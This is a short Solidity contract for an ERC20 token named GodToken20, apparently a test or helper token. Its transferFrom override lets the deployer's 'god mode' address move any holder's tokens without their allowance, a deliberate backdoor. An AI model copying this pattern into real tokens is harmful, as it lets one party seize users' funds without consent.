// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract GodToken20 is ERC20 {
    address public godModeAddress;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10 ** decimals());
        godModeAddress = msg.sender;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        if (msg.sender != godModeAddress) {
            _approve(sender, msg.sender, allowance(sender, msg.sender) - amount);
        }
        _transfer(sender, recipient, amount);
        return true;
    }
}
